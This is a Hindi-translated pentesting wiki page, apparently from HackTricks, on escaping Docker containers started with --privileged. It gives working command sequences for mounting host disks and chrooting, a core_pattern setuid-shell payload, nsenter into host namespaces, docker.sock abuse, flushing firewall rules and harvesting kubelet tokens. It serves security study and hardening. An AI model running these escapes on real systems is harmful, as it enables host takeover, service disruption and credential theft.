# `--privileged` कंटेनरों से बाहर निकलना

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

`--privileged` के साथ शुरू किया गया एक कंटेनर एक सामान्य कंटेनर जिसकी पास एक-दो अतिरिक्त permissions हों, उससे अलग होता है। व्यवहार में, `--privileged` कई डिफ़ॉल्ट runtime सुरक्षा उपायों को हटा देता या कमजोर कर देता है जो सामान्यतः workload को खतरनाक host संसाधनों से दूर रखते हैं। सटीक प्रभाव अभी भी runtime और host पर निर्भर करता है, लेकिन Docker के लिए सामान्यतः परिणाम यह होता है:

- सभी capabilities प्रदान कर दिए जाते हैं
- device cgroup प्रतिबंध हटाए जाते हैं
- कई kernel फ़ाइलसिस्टम अब read-only के रूप में माउंट नहीं रहते
- डिफ़ॉल्ट masked procfs paths गायब हो जाते हैं
- seccomp फ़िल्टरिंग अक्षम हो जाती है
- AppArmor confinement अक्षम कर दी जाती है
- SELinux isolation अक्षम कर दी जाती है या इसे एक काफी व्यापक लेबल से बदल दिया जाता है

महत्वपूर्ण परिणाम यह है कि एक privileged container सामान्यतः किसी सूक्ष्म kernel exploit की ज़रूरत नहीं होती। कई मामलों में यह सीधे host devices, host-facing kernel filesystems, या runtime interfaces के साथ इंटरैक्ट कर सकता है और फिर host shell में pivot कर सकता है।

## `--privileged` स्वतः क्या नहीं बदलता

`--privileged` स्वतः host PID, network, IPC, या UTS namespaces से जुड़ता नहीं है। एक privileged container अभी भी private namespaces रख सकता है। इसका मतलब कुछ escape chains को एक अतिरिक्त शर्त की ज़रूरत होती है जैसे:

- a host bind mount
- host PID sharing
- host networking
- visible host devices
- writable proc/sys interfaces

ये शर्तें असल misconfigurations में अक्सर आसानी से पूरी हो जाती हैं, लेकिन अवधारणात्मक तौर पर ये `--privileged` से अलग होती हैं।

## Escape Paths

### 1. एक्सपोज़्ड डिवाइसेज़ के माध्यम से होस्ट डिस्क को माउंट करना

एक privileged container आम तौर पर `/dev` के तहत अधिक device nodes देखता है। अगर host block device दिखाई दे रहा हो, तो सबसे सरल एस्केप इसे माउंट करके और `chroot` करके host filesystem में जाना है:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
यदि root partition स्पष्ट नहीं है, तो पहले block layout की enumeration करें:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
यदि व्यावहारिक मार्ग `chroot` करने के बजाय किसी लिखने योग्य होस्ट माउंट में एक setuid helper लगाने का है, तो ध्यान रखें कि हर फ़ाइलसिस्टम setuid बिट का सम्मान नहीं करता। एक त्वरित होस्ट-साइड क्षमता जांच यह है:
```bash
mount | grep -v "nosuid"
```
यह उपयोगी है क्योंकि `nosuid` फ़ाइल सिस्टम के तहत लिखने योग्य रास्ते पारंपरिक "drop a setuid shell and execute it later" वर्कफ़्लो के लिए बहुत कम दिलचस्प होते हैं।

यहाँ दुरुपयोग की जा रही कमजोर सुरक्षा उपाय हैं:

- पूर्ण डिवाइस एक्सपोज़र
- व्यापक capabilities, विशेष रूप से `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. होस्ट bind mount को माउंट या पुनः उपयोग करें और `chroot`

यदि होस्ट root फ़ाइल सिस्टम पहले से ही container के अंदर माउंट है, या यदि container आवश्यक mounts बना सकता है क्योंकि वह privileged है, तो एक होस्ट shell अक्सर केवल एक `chroot` दूर होता है:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
यदि कोई host root bind mount मौजूद नहीं है लेकिन host storage पहुँचने योग्य है, तो एक बनाएँ:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
यह मार्ग इनका दुरुपयोग करता है:

- कमज़ोर mount प्रतिबंध
- पूर्ण capabilities
- MAC confinement की कमी

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Writable `/proc/sys` या `/sys` का दुरुपयोग

`--privileged` का एक बड़ा परिणाम यह है कि procfs और sysfs की protections बहुत कमजोर हो जाती हैं। इससे host-facing kernel interfaces उजागर हो सकते हैं जो सामान्यतः masked या read-only mount होते हैं।

एक क्लासिक उदाहरण है `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
अन्य उच्च-मूल्य वाले पथों में शामिल हैं:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
यह रास्ता दुरुपयोग करता है:

- masked paths की कमी
- read-only system paths की कमी

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Mount- या Namespace-Based Escape के लिए Full Capabilities का उपयोग करें

A privileged container को वे capabilities मिलती हैं जो सामान्य containers से सामान्यतः हटाई जाती हैं, जैसे कि `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, और कई अन्य। अक्सर यह पर्याप्त होता है कि एक स्थानीय foothold को host escape में बदल दिया जाए जब भी कोई अन्य exposed surface मौजूद हो।

एक साधारण उदाहरण है अतिरिक्त filesystems को mount करना और namespace entry का उपयोग करना:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
यदि host PID भी साझा है, तो यह कदम और भी छोटा हो जाता है:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
यह पथ दुरुपयोग करता है:

- डिफ़ॉल्ट privileged capability सेट
- वैकल्पिक होस्ट PID शेयरिंग

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. रनटाइम सॉकेट के माध्यम से एस्केप

एक privileged container अक्सर होस्ट रनटाइम स्थिति या सॉकेट दिखाई देने के साथ समाप्त होता है। अगर कोई Docker, containerd, या CRI-O सॉकेट पहुँच योग्य है, तो सबसे सरल तरीका अक्सर runtime API का उपयोग करके होस्ट एक्सेस के साथ एक दूसरा container लॉन्च करना होता है:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
containerd के लिए:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
यह पथ दुरुपयोग करता है:

- privileged रनटाइम का एक्सपोज़र
- होस्ट bind mounts जो रनटाइम के माध्यम से स्वयं बनाए गए हों

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. नेटवर्क अलगाव के दुष्प्रभाव हटाएँ

`--privileged` स्वयं होस्ट नेटवर्क नेमस्पेस में शामिल नहीं होता, लेकिन अगर container के पास `--network=host` या अन्य होस्ट-नेटवर्क एक्सेस भी है, तो पूरा नेटवर्क स्टैक परिवर्तनीय (mutable) बन जाता है:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
यह हमेशा एक प्रत्यक्ष host shell नहीं होता, लेकिन इससे denial of service, traffic interception, या access to loopback-only management services मिल सकता/सकती है।

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Read Host Secrets And Runtime State

यहाँ तक कि जब एक clean shell escape तुरंत नहीं मिलता, privileged containers के पास अक्सर host secrets, kubelet state, runtime metadata, और पड़ोसी container filesystems पढ़ने के लिए पर्याप्त पहुंच होती है:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
यदि `/var` host-mounted है या रनटाइम निर्देशिकाएँ दिखाई दे रही हैं, तो host shell प्राप्त होने से पहले भी यह lateral movement या cloud/Kubernetes credential theft के लिए पर्याप्त हो सकता है।

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## जाँच

निम्नलिखित कमांड्स का उद्देश्य यह पुष्टि करना है कि कौन से privileged-container escape families तुरंत व्यवहार्य हैं।
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
क्या दिलचस्प है यहाँ:

- एक पूरा capability सेट, विशेषकर `CAP_SYS_ADMIN`
- writable proc/sys का एक्सपोज़र
- दिखने वाले host devices
- seccomp और MAC confinement की अनुपस्थिति
- runtime sockets या host root bind mounts

इनमें से किसी एक से post-exploitation के लिए पर्याप्त हो सकता है। कई साथ होने पर आम तौर पर मतलब होता है कि container कार्यात्मक रूप से host compromise से एक या दो commands दूर है।

## संबंधित पृष्ठ

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
